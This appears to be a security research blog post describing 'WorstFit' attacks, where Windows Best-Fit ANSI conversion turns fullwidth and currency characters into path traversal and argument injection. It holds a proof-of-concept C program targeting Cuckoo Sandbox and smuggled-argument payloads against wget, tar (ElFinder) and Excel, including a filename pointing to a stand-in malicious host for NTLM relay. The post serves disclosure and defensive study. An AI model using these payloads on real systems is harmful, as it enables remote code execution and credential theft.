+<p>➡️ <strong>Relevant API</strong>: <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getcurrentdirectory"><code>GetCurrentDirectoryA</code></a>, <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/getcwd?view=msvc-170"><code>getcwd</code></a>, <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-findfirstfilea"><code>FindFirstFileA</code></a>, <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/findfirst-functions?view=msvc-170"><code>findfirst*</code></a>, <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-getfullpathnamea"><code>GetFullPathNameA</code></a>, …<br>➡️ <strong>Affected Code Pages</strong>: 874, 125x, 932 (JP), 949 (KR)<br>➡️ <strong>Threat Characters</strong>: <code>／</code> <a target="_blank" rel="noopener" href="https://www.compart.com/en/unicode/U+FF0F">U+FF0F</a>, <code>＼</code> <a target="_blank" rel="noopener" href="https://www.compart.com/en/unicode/U+FF3C">U+FF3C</a>, <code>¥</code> <a target="_blank" rel="noopener" href="https://www.compart.com/en/unicode/U+00A5">U+00A5</a> (JP), <code>₩</code> <a target="_blank" rel="noopener" href="https://www.compart.com/en/unicode/U+20A9">U+20A9</a> (KR) </p>
+<p>Let’s start with a simple case. In Chrome V8, the underlying implementation of its Developer Shell (<code>d8.exe</code>) uses the ANSI API <code>GetCurrentDirectoryA()</code> to obtain the current working directory. This means that if we can have a working directory with malicious Unicode characters, these characters will automatically be converted into path traversal payloads when accessed via the ANSI API. As a result, it leads to an unintended file access.</p>
+<p><img src="/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/fb7a21f99453ce05667ddab07.png"><br><em>↑ Unintended file access on the <code>C:/windows/win.ini</code>:</em></p>
+<br>
+
+<p>Another case is the implementation of mruby <a target="_blank" rel="noopener" href="https://github.com/mruby/mruby/blob/3.3.0/mrbgems/mruby-dir/src/dir.c#L23"><code>Dir.getwd()</code></a> on Windows, the function relied on the ANSI version of CRT (C Runtime Library) <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/getcwd-wgetcwd?view=msvc-170"><code>_getcwd()</code></a> to retrieve the current directory. This also means that we can pollute that function’s return value, leading to Path Traversal, too!</p>
+<p><img src="/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/fb7a21f99453ce05667ddab0a.png"><br><em>↑ Pollute the return value of <code>Dir.getwd()</code>:</em></p>
+<br>
+
+<p>Of course, the above cases are still bugs instead of real vulnerabilities. Let’s take a look at some real-world cases!</p>
+<h4 id="➤-Case-Study-Path-Traversal-to-RCE-on-Cuckoo-Sandbox"><a href="#➤-Case-Study-Path-Traversal-to-RCE-on-Cuckoo-Sandbox" class="headerlink" title="➤ Case Study - Path Traversal to RCE on Cuckoo Sandbox"></a>➤ Case Study - Path Traversal to RCE on Cuckoo Sandbox</h4><p>Before diving into the vulnerability, it’s important to discuss Python first because it plays a significant role in this case! Conceptually, Python allows strings to be represented in two different types: <code>str</code> and <code>unicode</code> in Python 2, or <code>str</code> and <code>bytes</code> in Python 3. </p>
+<p>To support both string representations, the implementation of filesystem access used a structure field to determine whether a target path was wide or narrow. If the string was narrow, the corresponding ANSI API was used to process the path, making it susceptible to the Best-Fit behavior. Although <a target="_blank" rel="noopener" href="https://peps.python.org/pep-0529/">PEP 529</a> later standardized the filesystem encoding on Windows to UTF-8, earlier versions — such as Python 2 and Python 3 (prior to version 3.6) — remained vulnerable to WorstFit attacks.</p>
+<p>With the above context in mind, let’s have our first target — <a target="_blank" rel="noopener" href="https://cuckoosandbox.org/index.html">Cuckoo Sandbox</a>, a well-known automated malware analysis platform. As one of the few open-source solutions for malware analysis in early days, it was the go-to choice for organizations building their own platforms, and for malware researchers seeking to extend its functionality. However, since Cuckoo has not been actively maintained for many years, the latest official version still relies on Python 2.7, which exposes it to our WorstFit Attack!</p>
+<p>Cuckoo consists of two main components: the <strong>Cuckoo Host</strong> and the <strong>VM Cluster</strong>. The uploaded samples are isolated within virtual machines to ensure they do not affect the Cuckoo. The components use a dedicated channel to synchronize the behaviors such as captured network packets, dropped files, and output logs with their own mechanism. However, since the Cuckoo Host is written in Python and relied on an outdated version, a dropped file with a Unicode filename can traverse the path on the Cuckoo Host!</p>
+<p>Here’s a simple Proof of Concept:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    LPCWSTR filePath = <span class="string">L&quot;AAAA\u00a5..\u00a5..\u00a5..\u00a5..\u00a5..\u00a5conf\u00a5cuckoo.conf&quot;</span>;</span><br><span class="line">    HANDLE hFile = CreateFileW(</span><br><span class="line">        filePath, GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line">    </span><br><span class="line">    CloseHandle(hFile);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Once the analysis has finished, users can view the logs and dropped files generated by the malware through the web interface. An attacker can trigger a file operation on Python by clicking the download button. The Cuckoo Host then processes a translated path, containing <code>../</code> and sends sensitive data to the attacker.</p>
+<p><img src="/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/fb7a21f99453ce05667ddab11.png"></p>
+<br>
+
+<p>The attacker can then download <code>cuckoo.conf</code>, and gathered several sensitive information to calculate the Flask PIN code, ultimately achieving RCE on the Sandbox Host!</p>
+<iframe width="560" height="315" src="https://www.youtube.com/embed/EeMcDT95WSM?si=NJ8xmmWNEICeq-d7" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+
+<br>
+
+<h3 id="🔥-Argument-Splitting"><a href="#🔥-Argument-Splitting" class="headerlink" title="🔥 Argument Splitting"></a>🔥 Argument Splitting</h3><p>We can also exploit the WorstFit behavior in command line parsing by manipulating the output of <code>GetCommandLineA</code>. With this trick, even if you can control just a small part of an argument, that’s more than enough to inject as many arguments as you want!</p>
+<p>This time, we’re zeroing in on characters that map to either a double quote (<code>&quot;</code>, 0x22) or a backslash (<code>\</code>, 0x5C). Once again, fullwidth characters come in handy here, and when it comes to backslashes, those currency symbols we talked about earlier make a comeback!</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://worst.fit/mapping/#to%3A0x22">Characters mapped to <code>&quot;</code> (0x22)</a></li>
+<li><a target="_blank" rel="noopener" href="https://worst.fit/mapping/#to%3A0x5c">Characters mapped to <code>\</code> (0x5C)</a></li>
+</ul>
+<p>➡️ <strong>Relevant API</strong>: <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/processenv/nf-processenv-getcommandlinea"><code>GetCommandlineA</code></a>, <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/cpp/c-language/main-function-and-program-execution?view=msvc-170"><code>int main()</code></a><br>➡️ <strong>Affected Code Pages</strong>: 874, 125x, 932 (JP), 949 (KR)<br>➡️ <strong>Threat Characters</strong>: <code>＂</code> <a target="_blank" rel="noopener" href="https://www.compart.com/en/unicode/U+FF02">U+FF02</a>, <code>＼</code> <a target="_blank" rel="noopener" href="https://www.compart.com/en/unicode/U+FF3C">U+FF3C</a>, <code>¥</code> <a target="_blank" rel="noopener" href="https://www.compart.com/en/unicode/U+00A5">U+00A5</a> (JP), <code>₩</code> <a target="_blank" rel="noopener" href="https://www.compart.com/en/unicode/U+20A9">U+20A9</a> (KR) </p>
+<p>Let’s circle back to the piece of code we discussed earlier. How might this seemingly simple snippet fail, and more importantly, how could an attacker exploit it?</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$url</span> = <span class="string">&quot;https://example.tld/&quot;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>] . <span class="string">&quot;.txt&quot;</span>;</span><br><span class="line">  <span class="title function_ invoke__">system</span>(<span class="string">&quot;wget.exe -q &quot;</span> . <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$url</span>));</span><br></pre></td></tr></table></figure>
+
+<p>The answer is quite simple. If an attacker provides the input: <code>＂ --use-askpass=calc ＂</code><br>It could pop <strong>calc.exe</strong> on the system! </p>
+<p>At this point, you might be thinking, <em>“Oh, it’s PHP messing up again, isn’t it? I know PHP always…”</em> But nope – even switching to <strong>Node.js</strong>, <strong>Rust</strong>, or <strong>Python</strong> doesn’t save you. Here’s an example in Python, and the same input works like a charm – this time on the latest version of Python, not just older ones:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/fetch&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fetch</span>():</span><br><span class="line">    path = request.args.get(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line">    subprocess.run([<span class="string">&quot;wget&quot;</span>, <span class="string">&quot;-q&quot;</span>, <span class="string">f&quot;https://example.tld/<span class="subst">&#123;path&#125;</span>.txt&quot;</span>])</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Done&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>So, is this wget’s problem? Well, spoiler alert: yes, it’s part of the issue, but it doesn’t stop there. The same trick works on other executables like <strong>openssl.exe</strong>, <strong>tar.exe</strong>, <strong>java.exe</strong>, and more CLI tools. This makes us realize, this can actually be a broader systemic issue with how argument handling works on Windows, creating an attack surface across various tools. So, how does it happen?</p>
+<p>Let’s back to our payload <code>＂ --use-askpass=calc ＂</code>. I guess now some of you might still be wondering: <em>Wait, how does a simple double quote bypass the escaping? What exactly does it escape, then?</em> Well, first of all, these aren’t just regular double quotes (<code>U+0022</code>) — they’re actually <strong>fullwidth double quotes</strong> (<code>U+FF02</code>) 😉. Thanks to the Best-Fit feature, in code pages like 125x and 874, fullwidth double quotes are automatically converted into standard double quotes (<a target="_blank" rel="noopener" href="https://worst.fit/mapping/#from%3A0xFF02%20to%3A0x22">🔍</a>).</p>
+<p>But still, why can these double quotes alter the arguments?</p>
+<p>Firstly, on Windows, the <strong>entire command line</strong> is passed as a single string to the spawned process, leaving it up to the executable to parse. That’s why the <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw">CreateProcess API</a> accepts the <code>lpCommandLine</code> parameter directly. This differs from UNIX-like systems, where arguments are always passed as an array of strings. For a more detailed explanation of argument parsing on Windows, check out <a target="_blank" rel="noopener" href="https://daviddeley.com/autohotkey/parameters/parameters.htm#WIN">this article</a> by David Deley.</p>
+<p><img src="/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/fb7a21f99453ce05667ddab48.png"></p>
+<p>Secondly, because the command line string is stored internally in wide character (Unicode) format, retrieving its ANSI string version involves Windows using the <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/processenv/nf-processenv-getcommandlinea"><code>GetCommandLineA</code></a> API.  Which of course the Best-Fit feature is applied during this process, potentially altering the command line in subtle but impactful ways.</p>
+<p>But actually, there isn’t a single “standard” way to parse the command line on Windows. However, the parsing convention typically adheres to the rules of <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-commandlinetoargvw"><code>CommandLineToArgvW</code></a> or <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/cpp/cpp/main-function-command-line-args#parsing-c-command-line-arguments">CRT command-line parsing</a>. In practice, most developers use either <code>CommandLineToArgvW</code> or CRT standard <code>int main(...)</code> to handle command-line arguments, so I’d say we can pretty much treat this as the standard. The key characters involved in the parsing process include:</p>
+<ul>
+<li><strong>Tabs (0x09) and spaces (0x20)</strong>: Used to separate arguments (except when in quote mode). </li>
+<li><strong><code>&quot;</code> (0x22)</strong>: Toggles the quote mode to treat spaces as part of the argument. </li>
+<li><strong><code>\</code> (0x5C)</strong>: Escapes double quotes and backslashes when used in a specific sequence.</li>
+</ul>
+<p>These conventions form the foundation of how arguments are interpreted and passed to executables.</p>
+<p>Therefore, standard libraries and functions in most programming languages adhere to these parsing rules to sanitize user-provided arguments.  For instance, in <strong>PHP</strong>, the <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/function.escapeshellarg.php"><code>escapeshellarg</code></a> function replaces double quotes with spaces, wraps the argument in quotes, and escapes backslashes as needed to ensure safe execution in the shell.  Similarly, in <strong>Python</strong>, the <code>subprocess</code> module internally uses the <a target="_blank" rel="noopener" href="https://github.com/python/cpython/blob/v3.12.8/Lib/subprocess.py#L576"><code>list2cmdline</code></a> function to convert a Python list into a command line string, escaping arguments strictly according to the Microsoft CRT command-line parsing logic.</p>
+<p>However, all of this escaping happens before the Best-Fit feature comes into play. This means that even carefully escaped arguments can still be altered during the ANSI conversion process.</p>
+<p>Here’s a simple example. Using the example Python code we provided, let’s examine what happens when <code>wget.exe</code> is spawned with <code>subprocess</code> module. The entire argument parsing process would look something like this:</p>
+<p><img src="/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/fb7a21f99453ce05667ddab4f.png"></p>
+<p>As we saw, fullwidth quotation marks (<code>U+FF02</code>) are transformed into regular double quotes (<code>U+0022</code>) during the Best-Fit conversion process. This subtle alteration changes the original command-line syntax, enabling argument-splitting behavior. </p>
+<p>Furthermore, even programs that don’t directly use <code>GetCommandLineA</code> can still be vulnerable to this attack if they rely on the non-Unicode version of the main function. Yes, we’re talking about the <strong>innocent-looking <code>int main()</code></strong>!</p>
+<p>Here we can do a small experiment. Given this piece of code</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[], <span class="type">char</span>* envp[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; argc; ++i)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;argv[%d] = %s\n&quot;</span>, i, argv[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Now, when we run the command <code>.\test.exe &quot;foo＂ ＂bar&quot;</code>, it does produce two arguments, as shown below.</p>
+<p><img src="/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/fb7a21f99453ce05667ddab51.png"></p>
+<p>And yes, Python’s <code>subprocess</code> module can’t prevent this. Even if the entire string is passed as a single list element, it still ends up being parsed into two separate arguments.</p>
+<p><img src="/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/fb7a21f99453ce05667ddab52.png"></p>
+<p>The reason a normal <code>main</code> function becomes vulnerable lies in how the <strong>C runtime (CRT)</strong> handles command-line arguments.  Even if you don’t explicitly call <code>GetCommandLineA</code>, once you use the <code>int main()</code> function, the compiler secretly generates a <code>mainCRTStartup</code> function inside your binary for you. This startup function is linked to the C runtime library (e.g., <code>ucrtbase.dll</code>), which internally retrieves the command line using an ANSI API and parses it for you. And that’s where the vulnerability creeps in.</p>
+<p><img src="/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/fb7a21f99453ce05667ddab34.png"></p>
+<p>This is why so many executables are exposed to WorstFit vulnerabilities. Worse still, as the attack exploits behavior at the system level during the conversion process, <strong>no standard library in any programming language can fully stop our attack!</strong></p>
+<p>However, only on 125x and 874 code pages does the fullwidth quotation mark (<code>U+FF02</code>) get converted into a normal double quote. So, what about CJK (Chinese, Japanese and Korean) languages? Are they safe now? Not entirely. Double quote is NOT the only character we can use for this attack!</p>
+<p>As mentioned in the <strong>Filename Smuggling</strong> section, the Yen sign (<code>U+00A5</code>) on the Japanese (932) code page and the Won sign (<code>U+20A9</code>) on the Korean (949) code page are both converted into a <strong>backslash (<code>\</code>)</strong>. And what can a backslash do? Quite a lot! As we’ve discussed, the backslash is crucial for escaping characters and altering the syntax of a command line. This means it can be exploited to manipulate command execution.</p>
+<p>Let’s take this Python code as an example:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">subprocess.run([<span class="string">&#x27;vuln.exe&#x27;</span>, <span class="string">&#x27;foo¥&quot; bar&#x27;</span>])</span><br></pre></td></tr></table></figure>
+
+<p>Here, Python handles escaping for us – in this case, escaping the double quote. After escaping, the command line should look like this:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vuln.exe &quot;foo¥\&quot; bar&quot;</span><br></pre></td></tr></table></figure>
+
+<p>Python prepends a backslash before the double quote to escape it. Everything seems fine, so Python passes this command line to the <code>CreateProcessW</code> API, and <code>vuln.exe</code> spawns successfully. Great!</p>
+<p>However, here’s where it gets tricky. The <code>vuln.exe</code> program uses an <strong>ANSI API</strong> to retrieve the command line. Thanks to the Best-Fit feature (again 😜), the Yen sign (<code>¥</code>) is converted into a backslash (<code>\</code>). Now, the command line seen by <code>vuln.exe</code> becomes:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vuln.exe &quot;foo\\&quot; bar&quot;</span><br></pre></td></tr></table></figure>
+
+<p>The backslash added by Python is now escaped by the “ex-Yen-sign”. As a result, that double quote is no longer properly escaped, allowing it to act as a delimiter. The arguments for <code>vuln.exe</code> are now split into two parts: <code>foo\</code> and <code>bar</code>.</p>
+<p><em><strong>Note</strong>: Of course, characters that can be converted into spaces or tabs can also be exploited for argument splitting. I’ll leave this part as an exercise for you 😉.</em></p>
+<br>
+
+<p>Now, we already explored most of the possible ways to exploit WorstFit for argument splitting. Let’s dive into some real-world exploits and see this attack in action!</p>
+<h4 id="➤-Case-Study-1-ElFinder-RCE-w-Windows-built-in-GNU-Tar"><a href="#➤-Case-Study-1-ElFinder-RCE-w-Windows-built-in-GNU-Tar" class="headerlink" title="➤ Case Study 1 - ElFinder: RCE w&#x2F; Windows built-in GNU Tar"></a>➤ Case Study 1 - ElFinder: RCE w&#x2F; Windows built-in GNU Tar</h4><p>Here, one of our case studies highlights an RCE (Remote Code Execution) attack on <a target="_blank" rel="noopener" href="https://github.com/Studio-42/elFinder"><strong>ElFinder</strong></a>, caused by the WorstFit vulnerability in Windows’ <code>tar.exe</code> command.</p>
+<p>ElFinder is a popular open-source, web-based file manager with a PHP backend. By default, it supports Windows servers and comes with a built-in feature for creating and extracting archives, which is also enabled by default.</p>
+<p>The way it handles archive formats is straightforward—it directly executes shell commands.  Sounds risky? Perhaps. But the developers have taken precautions by escaping all arguments properly using <code>escapeshellarg</code> (<a target="_blank" rel="noopener" href="https://github.com/Studio-42/elFinder/blob/7544918a2ba656a4fe72a6fc8bb502d39f601cda/php/elFinderVolumeDriver.class.php#L6898-L6911"><code>php/elFinderVolumeDriver.class.php#L6898-L6911</code></a>).</p>
+<p><img src="/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/fb7a21f99453ce05667ddab1a.png"></p>
+<p>Despite this effort, escaping at the application level might not fully mitigate risks if quirks like the Best-Fit feature in Windows are involved.</p>
+<p>One of the archive formats supported by ElFinder is the <strong>tar</strong> format. It uses the system’s built-in <code>tar.exe</code> command to create or extract archives. For example, if we create an archive named <code>foobar.tar</code> containing the files <code>foo.txt</code> and <code>bar.txt</code>, ElFinder would just execute the following command: <code>tar.exe -chf &quot;foobar.tar&quot; &quot;.\foo.txt&quot; &quot;.\bar.txt&quot;</code></p>
+<p>However, we discovered that the Windows built-in <code>tar.exe</code> command is vulnerable to the <strong>WorstFit</strong> attack! This means that if you can control even a small part of an argument, it’s possible to execute arbitrary commands. For details, check out our <a target="_blank" rel="noopener" href="https://worst.fit/worstfit/Arg-Splitting/tar/">curated list</a>.</p>
+<p>To exploit this, we can simply name the tar file as <code>aaa＂ ＂--use-compress-program=calc＂ ＂bbb.tar</code> (<code>＂</code> is <code>U+FF02</code>). This injects the <code>--use-compress-program</code> parameter, which allows arbitrary command execution. In our demonstration, this results in popping up <code>calc.exe</code>.</p>
+<iframe width="560" height="315" src="https://www.youtube.com/embed/DPIp42-Ls0U?si=dczou7dD-p4CSOQ9" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+
+<br>
+
+<p><em>P.S. In this demonstration, we use an English-configured Windows server (Code Page 1252) as an example. This technique should also work on other 125x code pages and Code Page 874 configurations.</em></p>
+<br>
+
+<h4 id="➤-Case-Study-2-All-the-Ways-to-Code-Execution"><a href="#➤-Case-Study-2-All-the-Ways-to-Code-Execution" class="headerlink" title="➤ Case Study 2+ - All the Ways to Code Execution"></a>➤ Case Study 2+ - All the Ways to Code Execution</h4><p>Of course, there are more applications are indirectly exposed to WorstFit vulnerabilities because they invoke other executables that are themselves vulnerable to this. Here we demonstrate two examples:</p>
+<p>The first one involves a modified version of plink.exe used in <strong>TortoiseGit</strong>. When a user enters a malicious URI for cloning, it can trigger code execution. For details, check out our <a target="_blank" rel="noopener" href="https://worst.fit/worstfit/Arg-Splitting/plink/">curated list</a>.</p>
+<iframe width="560" height="315" src="https://www.youtube.com/embed/EF1U-C0e_9E?si=oEKebidfQ1hRIead" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+
+<br>
+
+<p>The second example involves <strong>RStudio</strong>, which supports version control with SVN. If an SVN project is placed in a maliciously crafted folder, a single click can trigger a calculator to pop up on the user’s machine! For more details, check out our <a target="_blank" rel="noopener" href="https://worst.fit/worstfit/Arg-Splitting/SVN/">curated list</a>.</p>
+<iframe width="560" height="315" src="https://www.youtube.com/embed/YKw4ZcQ75Hc?si=Gd6pZ7r4wLToX15m" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+
+<br>
+
+<h4 id="➤-Case-Study-3-Microsoft-Excel-Remote-Code-Execution-CVE-2024-49026"><a href="#➤-Case-Study-3-Microsoft-Excel-Remote-Code-Execution-CVE-2024-49026" class="headerlink" title="➤ Case Study 3 - Microsoft Excel Remote Code Execution CVE-2024-49026"></a>➤ Case Study 3 - Microsoft Excel Remote Code Execution <a target="_blank" rel="noopener" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-49026">CVE-2024-49026</a></h4><p>While re-mounting Argument Injection to applications, we discovered that the Argument Splitting attack can be combined with the “Open-With” feature to escalate its impact! </p>
+<p>Windows actually maintains a handler table to know which program to use to open a file when you double-click a file. You can use <code>ftype</code> and <code>assoc</code> to see which programs handle specific file extensions. The filename would also become part of the argument, which means we can apply our attack through that!</p>
+<p><img src="/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/fb7a21f99453ce05667ddab1b.png"></p>
+<br>
+
+<p>We then discovered that the executable of Microsoft Excel is vulnerable to the Argument Splitting attack. We can just rename the Excel file to the following name - translating all dots, (back-)slashes, and double quote to their fullwidth forms.</p>
+<blockquote>
+<p><code>．．／．．／．．／Windows／win.ini＂ ／n ＂＼＼malicious.tld@80＼pwn.xlsx</code></p>
+</blockquote>
+<p>By combining two tricks, we can trigger an Argument Injection on <code>Excel.exe</code> with just 1-Click. Since Excel itself <a target="_blank" rel="noopener" href="https://support.microsoft.com/en-us/office/command-line-switches-for-microsoft-office-products-079164cd-4ef5-4178-b235-441737deb3a6#Category=Excel">doesn’t have any good argument</a> for further exploitation, we only use NTLM Relay along with RBCD&#x2F;ADCS to achieve RCE!</p>
+<iframe width="560" height="315" src="https://www.youtube.com/embed/zklkmbDyR1U?si=dLfxuwaO5U2En20n" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+
+<br>
+
+<p><em>P.S. if you find a better argument that can directly lead to RCE, please let us know!</em> 🙂</p>
+<br>
+
+<h3 id="🔥-Environment-Variable-Confusion"><a href="#🔥-Environment-Variable-Confusion" class="headerlink" title="🔥 Environment Variable Confusion"></a>🔥 Environment Variable Confusion</h3><p>When functions like <code>GetEnvironmentVariableA</code>, <code>GetEnvironmentStringsA</code>, or <code>char *getenv(const char *varname)</code> are used, they return the <strong>Best-Fit</strong> version of the environment variable. This subtle behavior can be exploited to bypass character restrictions, creating potential opportunities for attackers to slip through otherwise secure validations and introduce security vulnerabilities.</p>
+<p>➡️ <strong>Relevant API</strong>: <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/processenv/nf-processenv-getenvironmentvariablea"><code>GetEnvironmentVariableA</code></a>, <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/getenv-wgetenv"><code>char *getenv(const char *varname)</code></a><br>➡️ <strong>Affected Code Pages</strong>: No specific<br>➡️ <strong>Threat Characters</strong>: No specific (for Apache HTTPd: 0x00-0xFF)</p>
+<p>For this exploit scenario, the environment variables must be user-controllable, which often occurs when a parent process needs to pass information to a spawned process. </p>
+<p>A common example is in <strong>CGI (Common Gateway Interface)</strong>, where much of the HTTP request information—such as query strings, HTTP headers, and more—is passed through environment variables. This creates an opportunity for attackers to manipulate these variables and exploit the behavior. Here, we present two case studies as a starting point to spark your further ideas.</p>
+<h4 id="➤-Case-study-1-WAF-bypass"><a href="#➤-Case-study-1-WAF-bypass" class="headerlink" title="➤ Case study 1 - WAF bypass"></a>➤ Case study 1 - WAF bypass</h4><p>In some scenarios, a CGI script may act as a routing service. When this happens, the portion of the URL path after the CGI executable is stored in the environment variable <code>PATH_INFO</code>. A common use case might involve a developer trying to restrict remote access to sensitive endpoints, such as <code>/cgi.pl/admin</code> from the web server, instead of the CGI itself. For example, in an Apache setup, they might add the following rule to deny access:  </p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;Directory <span class="string">&quot;/var/www/cgi-bin&quot;</span>&gt;</span></span><br><span class="line">    <span class="section">&lt;If <span class="string">&quot;%&#123;REQUEST_URI&#125; =~ m#/admin#&quot;</span>&gt;</span></span><br><span class="line">        <span class="attribute">Require</span> <span class="literal">all</span> denied</span><br><span class="line">    <span class="section">&lt;/If&gt;</span></span><br><span class="line"><span class="section">&lt;/Directory&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>However, due to the <strong>WorstFit vulnerability</strong> in Perl on Windows, this rule can be bypassed by substituting characters in <code>admin</code> with their <strong>Best-Fit equivalents</strong>. For instance, in <strong>Code Page 1250</strong>, the character <code>à</code> (<code>U+00E0</code>) is converted to <code>a</code> during the ANSI conversion. </p>
+<p>By crafting a URL like <code>/cgi.pl/%E0dmin</code>, an attacker can bypass the Nginx rule, as the server interprets it as a different path, but Perl’s CGI script retrieves the <code>PATH_INFO</code> environment variable with ANSI API, and processes it as <code>/admin</code> after the Best-Fit conversion.</p>
+<h4 id="➤-Case-study-2-PHP-CGI-Local-File-Inclusion-LFI"><a href="#➤-Case-study-2-PHP-CGI-Local-File-Inclusion-LFI" class="headerlink" title="➤ Case study 2 - PHP-CGI Local File Inclusion (LFI)"></a>➤ Case study 2 - PHP-CGI Local File Inclusion (LFI)</h4><p>The previous example was hypothetical, but here’s a real-world case we discovered. In <strong>PHP-CGI on Windows</strong>, we identified a file existence check oracle and even a potential LFI (Local File Inclusion) vulnerability under certain configurations.</p>
+<p>The root cause lies in how <code>PATH_INFO</code> — and other path-related environment variables — are handled. Let’s break it down:</p>
+<p>Imagine a request URI like this:  <code>http://victim.tld/index.php/foo/bar</code></p>
+<p>After the web server (e.g., IIS, Apache, or another PHP-CGI-compatible server) processes it, it generates several environment variables. Depending on the server, these might look like this in Apache:</p>
